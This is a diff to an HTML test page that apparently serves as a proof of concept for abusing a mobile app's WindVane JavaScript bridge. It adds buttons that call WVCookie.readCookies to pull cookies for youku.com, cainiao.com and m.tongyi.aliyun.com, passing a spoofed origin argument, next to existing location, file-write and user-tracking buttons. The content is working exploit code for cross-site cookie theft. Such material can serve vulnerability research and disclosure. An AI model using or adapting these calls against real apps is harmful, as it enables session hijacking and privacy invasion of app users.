@@ -23,7 +23,9 @@
 <body>
   <button id="getLocationButton">Get Location</button>
   <button id="writeFileButton">Write File</button>
-  <button id="readCookiesButton">Read Cookies</button>
+  <button id="youkuReadCookiesButton">Youku Read Cookies</button>
+  <button id="cainiaoReadCookiesButton">Cainiao Read Cookies</button>
+  <button id="tongyiReadCookiesButton">Tongyi Read Cookies</button>
   <button id="userTracker">User Tracker</button>
 
   <script>
@@ -66,11 +68,25 @@
     });
 
     // Button to read cookies
-    document.getElementById('readCookiesButton').addEventListener('click', function() {
+    document.getElementById('youkuReadCookiesButton').addEventListener('click', function() {
       var cookie_params = {
         url: "www.youku.com"
       };
       window.__windvane__.nativeCall('WVCookie.readCookies', JSON.stringify(cookie_params), "successCallback", "https://equity.tmall.com");
+    });
+
+    document.getElementById('cainiaoReadCookiesButton').addEventListener('click', function() {
+      var cookie_params = {
+        url: "www.cainiao.com"
+      };
+      window.__windvane__.nativeCall('WVCookie.readCookies', JSON.stringify(cookie_params), "successCallback", "https://www.cainiao.com");
+    });
+
+    document.getElementById('tongyiReadCookiesButton').addEventListener('click', function() {
+      var cookie_params = {
+        url: "m.tongyi.aliyun.com"
+      };
+      window.__windvane__.nativeCall('WVCookie.readCookies', JSON.stringify(cookie_params), "successCallback", "https://m.tongyi.aliyun.com");
     });
 
 
